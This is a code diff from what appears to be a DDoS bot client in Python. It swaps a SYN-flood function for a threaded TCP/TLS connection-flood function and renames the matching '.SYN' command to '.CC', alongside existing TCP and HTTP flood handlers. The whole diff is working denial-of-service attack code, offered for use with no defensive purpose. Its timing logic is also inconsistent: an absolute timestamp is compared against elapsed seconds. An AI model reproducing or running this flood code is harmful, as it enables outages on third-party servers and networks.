@@ -51,15 +51,22 @@ def attack_tcp(ip, port, secs, size):
         except:
             pass
 
-def attack_syn(ip, port, secs):
-    while time.time() < secs:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.setblocking(0)
+def attack_cc(ip, port, secs):  # connection flood
+    global stop
+    start_time = time.time()
+    while True:
+        if stop or (time.time() - start_time) >= secs:
+            break
         try:
-            dport = random.randint(1, 65535) if port == 0 else port
-            s.connect((ip, dport)) # RST/ACK or SYN/ACK as response
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((str(ip), int(port)))
+            if int(port) == 443:
+                ctx = ssl.SSLContext()
+                s = ctx.wrap_socket(s, server_hostname=ip)
+            s.send("\000".encode())
+            s.close()
         except:
-            pass
+            s.close()
 
 def attack_http(ip, secs):
     while time.time() < secs:
@@ -133,14 +140,14 @@ def main():
                 for _ in range(threads):
                     threading.Thread(target=attack_tcp, args=(ip, port, secs, size), daemon=True).start()
 
-            elif command == '.SYN':
+            elif command == '.CC':
                 ip = args[1]
                 port = int(args[2])
                 secs = time.time() + int(args[3])
                 threads = int(args[4])
 
                 for _ in range(threads):
-                    threading.Thread(target=attack_syn, args=(ip, port, secs), daemon=True).start()
+                    threading.Thread(target=attack_cc, args=(ip, port, secs), daemon=True).start()
 
             elif command == '.HTTP':
                 ip = args[1]
